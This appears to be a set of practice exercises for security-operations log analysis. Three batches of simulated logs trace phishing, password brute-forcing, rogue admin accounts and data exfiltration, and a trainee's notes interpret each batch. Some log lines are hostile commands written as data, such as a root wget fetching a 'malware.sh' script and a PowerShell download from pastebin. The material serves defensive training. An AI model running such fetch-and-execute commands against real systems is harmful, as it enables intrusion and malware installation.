@@ -1,0 +1,195 @@
+LOGS EXERCISES 
+-------------------------------------------------
+Exercise 1. 
+
+LOGS: 
+
+1. index=email sourcetype=mail_log sender="attacker@phishdomain.com" recipient="alice@corp.local" subject="Urgent: Update Your Account Info"
+2. index=email sourcetype=mail_log action="delivered" status="clean" recipient="alice@corp.local"
+3. index=proxy sourcetype=web_proxy user="alice" url="http://phishportal.xyz/login" action="clicked"
+4. index=web sourcetype=web_logs method=POST user="alice" uri="/login" status=200 user_agent="Mozilla/5.0"
+5. index=vpn sourcetype=vpn_logs user="alice" action="login" src_ip="178.45.32.22" status="success"
+6. index=windows sourcetype=wineventlog:security EventCode=4624 user="alice" LogonType=10 src_ip="178.45.32.22" Workstation="CORP-WS01"
+7. index=windows sourcetype=wineventlog:security EventCode=4625 user="admin" LogonType=3 src_ip="178.45.32.22" failure_reason="Bad password"
+8. index=windows sourcetype=wineventlog:security EventCode=4776 user="alice" status="success" AuthPackage="NTLM"
+9. index=firewall sourcetype=fw_log src_ip="178.45.32.22" dst_ip="192.168.10.25" dst_port=445 action="allowed"
+10. index=edr sourcetype=edr_logs host="CORP-WS01" user="alice" file="powershell.exe" command="Invoke-Command -ScriptBlock {Get-LocalUser}"
+11. index=windows sourcetype=wineventlog:security EventCode=4688 NewProcessName="powershell.exe" ParentProcess="explorer.exe" user="alice"
+12. index=windows sourcetype=wineventlog:security EventCode=4720 user="alice" TargetUser="tempadmin" Action="Created new user"
+13. index=windows sourcetype=wineventlog:security EventCode=4728 GroupName="Administrators" TargetUser="tempadmin" Action="Added to group"
+14. index=edr sourcetype=edr_logs host="CORP-SRV02" user="tempadmin" action="remote access" method="PSEXEC"
+15. index=vpn sourcetype=vpn_logs user="tempadmin" action="login" src_ip="89.210.45.10" status="success"
+16. index=firewall sourcetype=fw_log src_ip="89.210.45.10" dst_ip="192.168.10.25" dst_port=3389 action="allowed"
+17. index=windows sourcetype=wineventlog:security EventCode=4648 user="tempadmin" target="CORP-SRV02" status="success"
+18. index=edr sourcetype=edr_logs file="cmd.exe" command="net user" host="CORP-SRV02" user="tempadmin"
+19. index=edr sourcetype=edr_logs file="powershell.exe" command="Get-Process" host="CORP-SRV02" user="tempadmin"
+20. index=windows sourcetype=wineventlog:security EventCode=4634 user="alice" Workstation="CORP-WS01"
+21. index=windows sourcetype=wineventlog:security EventCode=4634 user="tempadmin" Workstation="CORP-SRV02"
+22. index=email sourcetype=mail_log sender="noreply@corp.local" recipient="alice@corp.local" subject="Security Alert: New Device Sign-in"
+23. index=proxy sourcetype=web_proxy user="tempadmin" url="http://pastebin.com/maliciousscript" action="download"
+24. index=edr sourcetype=edr_logs file="maliciousscript.ps1" action="executed" host="CORP-SRV02" user="tempadmin"
+25. index=siem sourcetype=correlation_alert name="Suspicious Admin Creation" severity="high" triggered_by="EventCode 4720 + 4728"
+26. index=siem sourcetype=correlation_alert name="Unusual VPN Login" severity="medium" user="tempadmin" location="Unknown"
+27. index=siem sourcetype=correlation_alert name="PowerShell Recon" severity="medium" user="alice"
+28. index=siem sourcetype=correlation_alert name="Remote Access Detected" severity="high" user="tempadmin"
+29. index=windows sourcetype=wineventlog:security EventCode=1102 Action="Audit Log Cleared" user="tempadmin"
+30. index=edr sourcetype=edr_logs action="alert" alert_type="Persistence Mechanism Detected" host="CORP-SRV02" user="tempadmin"
+31. index=siem sourcetype=correlation_alert name="Possible Lateral Movement" severity="critical" user="tempadmin"
+
+
+ANALYSIS: 
+
+1 - 10 
+- user alice was compromised by unknown threat actor
+- alice clicked on phishing email which urget her to update account info
+- threat actor logged into alices account IP=178.45.32.22 and immediately started trying out passwords/password cracking for administrator priviledges 
+- after compromising administrator account the threat actor allowed traffic on firewall with port 445 and IP=192.168.10.25
+10 - 16
+- threat actor created new user with administrator rights and user "tempadmin" to whom he granted access by adding him to administrator group 
+- threat actor accessed the CORP-SRV02 through remote access with IP=89.210.45.10
+- his action was to allow IP=192.168.10.25 on CORP-SRV02 firewall with destination port 3389
+17 - 31 
+- new user tempadmin created by threat actor targeted corporate server CORP-SRV02 and user command line to lounch powershell
+- threat actor used web proxy server to download http[:]//pastebin[.]com/maliciousscript on corporate server CORP-SRV02 and also executed it as is stated in next log (file="maliciousscript.ps1" action="executed") on corporate server CORP-SRV02 
+- useradmin seems to be downloading and running malicious code to persist on internal network 
+
+additional which I missed: 
+Windows codes: 
+4624 + LogonType=10 → Very likely RDP logon
+4625 + many attempts → Strong brute force or spray signal
+
+
+-------------------------------------------------
+Exercise 2.
+
+01 - [WinEventLog:Security] user=jsmith workstation=ENG-WS01 EventCode=4624 LogonType=3 src_ip=10.0.1.15
+02 - [Firewall] src_ip=203.15.33.45 dst_ip=10.0.0.5 port=443 action=allowed
+03 - [VPN] user=mbrown login_success src_ip=88.102.45.12 method=twofactor
+04 - [SCADA] device=ICS-GW01 command="status check" user=system timestamp=08:45:03
+05 - [WinEventLog:Security] EventCode=4625 user=admin src_ip=172.31.88.22 reason="bad password"
+06 - [WinEventLog:Security] user=admin EventCode=4625 src_ip=172.31.88.22 reason="bad password"
+07 - [Firewall] src_ip=172.31.88.22 dst_ip=10.0.0.10 port=445 action=allowed
+08 - [Endpoint] ENG-WS01 PowerShell command="Invoke-WebRequest http://pastebin.com/scr123.ps1"
+09 - [VPN] user=engineer1 login_success src_ip=102.44.88.55 method=2FA
+10 - [WebApp:Auth] user=jsmith success src_ip=88.102.45.12 endpoint=gridportal.gridcore.com
+11 - [Firewall] src_ip=10.0.1.15 dst_ip=ICS-GW01 port=502 action=allowed
+12 - [WinEventLog:Security] EventCode=4624 LogonType=10 user=admin src_ip=172.31.88.22
+13 - [Sysmon] process=cmd.exe user=admin host=SCADA-SRV01 parent=powershell.exe
+14 - [AD] user=svc_sysadmin added_to_group=domain_admins by=admin
+15 - [WinEventLog:Security] EventCode=1102 user=admin host=SCADA-SRV01
+16 - [Firewall] src_ip=10.0.2.20 dst_ip=10.0.1.10 port=80 action=allowed
+17 - [WebApp:Alert] endpoint=gridportal.gridcore.com alert="SQL Error in login request"
+18 - [WebApp:Auth] user=test_user login_fail src_ip=177.23.12.1
+19 - [WinEventLog:Security] EventCode=4625 LogonType=3 user=test_user src_ip=177.23.12.1
+20 - [WinEventLog:Security] EventCode=4624 LogonType=3 user=svc_sysadmin src_ip=10.0.2.20
+21 - [SCADA] device=ICS-GW01 command="reboot issued" user=admin timestamp=09:12:44
+22 - [Endpoint] host=OP-WS03 file="C:\Users\Operator\Downloads\patch.pdf" action=opened
+23 - [VPN] user=contractor1 login_fail src_ip=203.150.33.55
+24 - [Firewall] src_ip=172.31.88.22 dst_ip=10.0.2.20 port=3389 action=allowed
+25 - [Sysmon] process=maliciousscript.ps1 hash=8abf...234 host=SCADA-SRV01 user=admin
+26 - [DNS] query=download.anydesk.com user=jsmith
+27 - [WinEventLog:Security] EventCode=4720 user=tempadmin created_by=admin
+28 - [WinEventLog:Security] EventCode=4728 user=tempadmin added_to_group=Administrators
+29 - [VPN] user=mbrown logout src_ip=88.102.45.12
+30 - [WebApp:Alert] alert="Possible XSS attempt" param="<script>" src_ip=44.33.12.10
+31 - [Endpoint] PowerShell: file="C:\Temp\maliciousscript.ps1" action=executed host=SCADA-SRV01
+33 - [SCADA] device=ICS-GW01 status=unreachable timestamp=09:15:12
+34 - [WinEventLog:Security] EventCode=4634 user=admin host=SCADA-SRV01
+35 - [AD] user=tempadmin password_reset initiated_by=admin
+36 - [WinEventLog:Security] EventCode=4648 user=tempadmin host=DC01.gridcore.local
+37 - [Sysmon] process=wmic.exe user=tempadmin action="create persistence"
+38 - [WinEventLog:Security] EventCode=4624 user=engineer1 LogonType=10 src_ip=102.44.88.55
+39 - [Endpoint] host=ENG-WS01 file="C:\Tools\pcap_viewer.exe" action=opened
+40 - [WebApp:Auth] user=admin login_fail src_ip=203.150.33.45
+41 - [Sysmon] process=netstat.exe user=admin host=SCADA-SRV01
+42 - [SCADA] device=ICS-GW01 alert="unauthorized command attempt" user=tempadmin
+43 - [Firewall] src_ip=172.31.88.22 dst_ip=ICS-GW01 port=502 action=allowed
+44 - [Endpoint] user=jsmith browser=Chrome url=https://www.gridnews.org/news.html
+45 - [VPN] user=contractor1 login_success src_ip=203.150.33.55
+46 - [Sysmon] process=rar.exe user=admin args="-a scada_logs.rar"
+47 - [Firewall] src_ip=172.31.88.22 dst_ip=88.102.45.12 port=21 action=allowed
+48 - [Endpoint] host=SCADA-SRV01 file="scada_logs.rar" action=uploaded destination=88.102.45.12
+49 - [WinEventLog:Security] EventCode=1102 user=tempadmin host=DC01.gridcore.local
+50 - [AD] user=admin locked_out reason=multiple_failed_logins
+
+ANALYSIS: 
+4 - 5 
+suspicious bad password for admin from same IP without any valid connection after that 
+8
+http://pastebin[.]com/scr123[.]ps1" - i am not sure what is this so I would look into it and try to find if it is legitimate website
+12, 13 - 16, 20 
+user admin logon from suspicious IP=172.31.88.22 which I suggest to monitor and after that we have log for svc_sysadmin added to group adminsitrators and firewall log for IP=10.0.2.20:80 which allowed logon from this IP in 20. I would suggest to keep an eye on this behavior since it is suspicious to me and I would rather take it as malicious until proven otherwise than to miss an attack 
+24 we have firewall log for allowing IP=172.31.88.22:3389 which I marked as suspicious in previous logs, I would mark this and escalate to L2 ASAP
+25 Sysmon of downloaded script with hash
+- check has in malicous file databases 
+26 anydesk - used for remote desktop is downloaded 
+30 possible xss attempt is concerning but i would skip that for now since our systems captured it and there doesn't seem to be any other attack or breach from that IP and we need to focus attention and resources on compromised attacker moving through network 
+31 we have endpoint of SCADA-SRV01 scada server 01 executed downloaded malicous script by threat actor from logs: 25 (maliciousscript.ps1) 
+35 user account tempadmin is compromised and also tried to reset password
+37 -38 we have engineer1 logon - this seems for now as legitimate engineer from company trying to help with incident, his IP is not any of the attackers that they used until now (IP=102.44.88.55) 
+40, 45 looks to me like someone from IP address range 203.150.33.30-45 is trying to access priviledged accounts, I would suggest even in this incident scenario blocking those IP range for 1 hour
+- contractor1 login_success src_ip=203.150.33.55 - seems like external contractor might have been compromised or their credentials stolen and now we have attacks trying to get into our network I would suggest adding all possible IP range in 203.150.33.1-254 to block for 1 hour 
+42
+- tempadmin is continuing with attempting to execute unauthorized commands 
+- source IP of attacker (IP=172.31.88.22) got priviledges on firewall to access ICS-GW01 on port 502 
+47
+- port 21 attacker allowed traffic from his external IP=172.31.88.22 to IP=88.102.45.12
+48
+- scada-logs.rar which might be a disguise or true logs forensic analysis will show in post incident analysis, right now we know attacker provided through his elevated priviledges lateral movement thorugh network and changed firewall policy to be able to exfiltrate data from internal network 
+
+IP addresses 88.102.45.12 & 172.31.88.22 are attacker related and would require immediate attention and blocking 
+
+
+-------------------------------------------------
+Exercise 3.
+
+here’s a log analysis practice exercise with 20 log entries. Your task is to analyze the logs and determine:
+
+If there’s anything suspicious
+What kind of event or attack it might be
+Whether you would escalate or not
+
+LOGS:
+Apr 15 08:23:01 srv1 sshd[1324]: Accepted password for alice from 10.0.0.15 port 51234 ssh2
+Apr 15 08:23:05 srv1 sshd[1325]: Accepted password for bob from 10.0.0.17 port 61235 ssh2
+Apr 15 08:25:13 srv1 sshd[1330]: Failed password for root from 203.0.113.45 port 54812 ssh2
+Apr 15 08:25:15 srv1 sshd[1331]: Failed password for root from 203.0.113.45 port 54813 ssh2
+Apr 15 08:25:17 srv1 sshd[1332]: Failed password for root from 203.0.113.45 port 54814 ssh2
+Apr 15 08:25:20 srv1 sshd[1333]: Failed password for root from 203.0.113.45 port 54815 ssh2
+Apr 15 08:30:12 srv1 sshd[1334]: Accepted password for carol from 10.0.0.20 port 52212 ssh2
+Apr 15 08:31:09 srv1 sudo: alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/vi
+Apr 15 08:35:02 srv1 sshd[1335]: Failed password for invalid user admin from 198.51.100.34 port 51012 ssh2
+Apr 15 08:35:05 srv1 sshd[1336]: Failed password for invalid user admin from 198.51.100.34 port 51013 ssh2
+Apr 15 08:40:41 srv1 sshd[1337]: Accepted password for dave from 10.0.0.21 port 52219 ssh2
+Apr 15 08:41:03 srv1 sudo: dave : TTY=pts/2 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.55/malware.sh
+Apr 15 08:41:17 srv1 kernel: Executed binary with suspicious hash: /tmp/malware.sh
+Apr 15 08:42:02 srv1 crond[1338]: (carol) CMD (/usr/bin/python3 /home/carol/cleanup.py)
+Apr 15 08:42:45 srv1 sshd[1339]: Failed password for root from 192.0.2.99 port 62311 ssh2
+Apr 15 08:42:47 srv1 sshd[1340]: Failed password for root from 192.0.2.99 port 62312 ssh2
+Apr 15 08:43:01 srv1 sshd[1341]: Failed password for root from 192.0.2.99 port 62313 ssh2
+Apr 15 08:44:32 srv1 sshd[1342]: Accepted password for alice from 10.0.0.15 port 51235 ssh2
+Apr 15 08:44:58 srv1 sshd[1343]: Failed password for invalid user test from 203.0.113.51 port 55555 ssh2
+Apr 15 08:45:03 srv1 sshd[1344]: Failed password for invalid user test from 203.0.113.51 port 55556 ssh2
+Apr 15 08:46:12 srv1 kernel: Outbound connection to 198.51.100.55 on port 4444 established
+
+CONCLUSION
+1330, 1331, 1332, 1333
+- root acces from same IP = 203.0.113.45
+
+1335, 1336
+- failed password from same IP for “admin” but would need more data to make conclusion so skipping for now
+
+user dave seems to connect through VPN or internal network but his actions are malicious and non-compliant with his normal behavior
+( COMMAND=/usr/bin/wget http[:]//198[.]51[.]100[.]55/malware[.]sh)
+- with root access
+
+next we have 1339, 1340, 1341 again failed login for root user this time from IP=192.0.2.99
+
+at 08:46:12 we have kernel outbound connection to 198.51.100.55 on port 4444 which us known for malicious purposes
+
+i would conclude that:
+user dave was compromised and immediately sent it to L2 Analyst as Critical priority
+with correlaction to kernel compromisation in later logs
+
+I would categorize sshd numbers 1330, 1331, 1332, 1333 + 1339, 1340, 1341 + 1343, 1344 as possible brute force attack or at least password cracking from different IPs but within short time frame
+in this case I would wait for possible compromise on some of the accounts -> if they behave suspicious
